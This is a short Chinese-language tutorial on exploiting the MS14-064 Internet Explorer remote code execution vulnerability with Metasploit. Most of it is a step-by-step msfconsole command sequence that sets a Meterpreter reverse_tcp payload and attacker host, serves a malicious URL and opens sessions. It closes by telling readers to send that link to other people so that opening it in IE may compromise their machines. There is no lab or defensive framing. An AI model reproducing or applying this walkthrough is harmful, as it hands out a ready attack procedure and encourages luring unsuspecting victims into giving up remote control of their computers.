ms14-064浏览器远程代码执行漏洞

简介

ms14-064是IE浏览器的一个远程代码执行漏洞,漏洞仅仅能够在部分IE浏览器里面成功攻击

攻击步骤:

msfconsole#打开控制台

search ms14-064#搜索模块

use exploit/windows/browser

/ms14_064_ole_code_execution#使用模块

show options#选项

set AllowPowershellPrompt true#设置第一步

set SRVHOST 192.168.0.106#设置为本地ip

set playload windows/meterpreter/reverse_tcp

set LHOST 192.168.0.106#本地IP

set target 1#目标1为windows7

run#开始

sessions查看连接的

sessions -i 4

sessions 4 开始连接

生成链接(在Using URL显示):

http://192.168.0.106:8080/emjjhj

查看高清大图

把Using URL这个链接发给别人让别人拿IE浏览器打开链接,别人可能就中招了

攻击是不可能百分百成功的有时候会可能因为你攻击的方式不对,各种操作系统环境因素导致攻击失败成不成功是不确定的
